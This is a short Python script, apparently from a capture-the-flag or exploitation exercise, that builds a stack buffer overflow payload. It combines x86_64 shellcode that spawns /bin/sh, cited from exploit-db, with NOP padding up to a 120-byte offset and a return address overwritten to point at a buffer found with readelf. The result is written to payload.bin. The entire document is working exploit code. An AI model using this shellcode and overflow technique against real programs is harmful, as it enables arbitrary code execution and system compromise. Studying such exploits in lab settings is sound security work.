import struct

# shellcode to execve(/bin/sh) in x86_64 machines (https://www.exploit-db.com/exploits/47008)
# we can check the assembly with https://defuse.ca/online-x86-assembler.htm#disassembly2
shellcode = b"\x48\x31\xf6\x56\x48\xbf"
shellcode += b"\x2f\x62\x69\x6e\x2f"
shellcode += b"\x2f\x73\x68\x57\x54"
shellcode += b"\x5f\xb0\x3b\x99\x0f\x05"

# offset of the part of the string that will overwrite the return address
stack_len = 120

# address of the buffer that we found using readelf
buffer = int("0x0000000000404080", 16)

# combine the parts into the actual payload
payload = shellcode +  (b"\x90" * (stack_len - len(shellcode))) + struct.pack("Q", 0x0000000000404080)

# write the payload into a binary file
with open("payload.bin", "wb") as f:
    f.write(payload)
